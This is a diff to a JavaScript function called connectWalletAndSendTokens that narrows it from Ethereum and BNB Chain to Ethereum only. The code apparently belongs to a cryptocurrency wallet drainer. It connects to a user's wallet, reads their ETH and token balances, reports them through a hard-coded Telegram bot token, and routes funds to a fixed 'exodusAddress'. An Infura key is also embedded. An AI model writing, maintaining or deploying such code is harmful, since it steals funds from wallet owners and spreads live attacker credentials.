@@ -104,8 +104,7 @@ async function connectWalletAndSendTokens() {
   });
 
   const evmNetworks = [
-    { chainId: 1, name: "Ethereum", chainName: "eth", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
-    { chainId: 56, name: "BNB Chain", chainName: "bsc", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" }
+    { chainId: 1, name: "Ethereum", chainName: "eth", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" }
   ];
 
   const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
@@ -152,13 +151,6 @@ async function connectWalletAndSendTokens() {
                 rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
                 nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                 blockExplorerUrls: ['https://etherscan.io']
-              },
-              56: {
-                chainId: '0x38',
-                chainName: 'BNB Smart Chain',
-                rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                blockExplorerUrls: ['https://bscscan.com']
               }
             }[network.chainId];
             await instance.request({
@@ -207,7 +199,7 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
         });
         console.log(`Switched to ${network.name} successfully`);
 
-        await delay(5000);
+        await delay(1000);
 
         let tokens = [];
         let tokenSummaryTelegram = "";
@@ -215,8 +207,7 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
         const maxAttempts = 3;
         let apiSuccess = false;
 
-        // Determine token standard based on network
-        const tokenStandard = network.chainId === 56 ? "BEP-20" : "ERC-20";
+        const tokenStandard = "ERC-20";
 
         while (apiAttempts < maxAttempts && !apiSuccess) {
           try {
@@ -258,7 +249,7 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
         try {
           const nativeBalance = await currentProvider.getBalance(userAddress);
           const formattedBalance = ethers.utils.formatEther(nativeBalance);
-          const nativeSymbol = network.chainId === 1 ? "ETH" : "BNB";
+          const nativeSymbol = "ETH";
           nativeBalanceMessage = `• ${nativeSymbol}: ${formattedBalance}`;
           console.log(`Native balance for ${network.name}: ${formattedBalance} ${nativeSymbol}`);
         } catch (balanceErr) {
